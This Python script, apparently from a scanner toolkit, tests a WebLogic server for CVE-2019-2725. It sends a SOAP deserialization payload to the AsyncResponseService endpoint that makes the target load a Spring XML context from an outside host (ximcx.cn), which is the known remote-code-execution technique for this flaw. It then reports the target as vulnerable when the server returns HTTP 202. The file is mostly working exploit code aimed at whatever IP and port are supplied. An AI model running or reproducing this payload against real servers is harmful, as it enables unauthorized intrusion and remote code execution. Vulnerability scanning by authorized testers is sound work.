#!/usr/bin/env python
# _*_ coding:utf-8 _*_
'''
 ____       _     _     _ _   __  __           _
|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\

'''
import requests
import sys
import logging

logging.basicConfig(filename='Weblogic.log',
                    format='%(asctime)s %(message)s',
                    filemode="w", level=logging.INFO)

headers = {'user-agent': 'ceshi/0.0.1'}

VUL=['CVE-2019-2725']

path='/_async/AsyncResponseService'

payload='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>http://ximcx.cn</string></void></class></java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>'


def run(dip,dport,index):
    r=requests.post('http://'+ str(dip) + ':' + str(dport) + path,headers=headers,data=payload,timeout=3)
    if(r.status_code==202):
        logging.info('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
        print('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
    else:
        logging.info('[-]Target weblogic not detected {}'.format(VUL[index]))
        print('[-]Target weblogic not detected {}'.format(VUL[index]))


if __name__=="__main__":
    dip = sys.argv[1]
    dport = int(sys.argv[2])
    run(dip,dport,0)